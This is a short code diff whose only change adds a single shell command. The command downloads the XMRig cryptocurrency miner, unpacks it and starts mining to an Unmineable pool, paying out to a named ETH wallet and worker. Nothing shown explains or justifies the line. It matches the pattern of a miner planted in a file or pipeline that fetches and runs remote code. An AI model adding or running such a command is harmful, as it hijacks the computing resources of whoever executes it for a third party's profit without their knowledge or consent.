@@ -1,1 +1,1 @@
-
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz && tar -zxf xmrig-6.14.0-linux-x64.tar.gz && cd xmrig-6.14.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0xd3fE66475C31df729CCb41fd926bcF1A44AAeBc3.joe_switch#8uzs-ktqt -p x
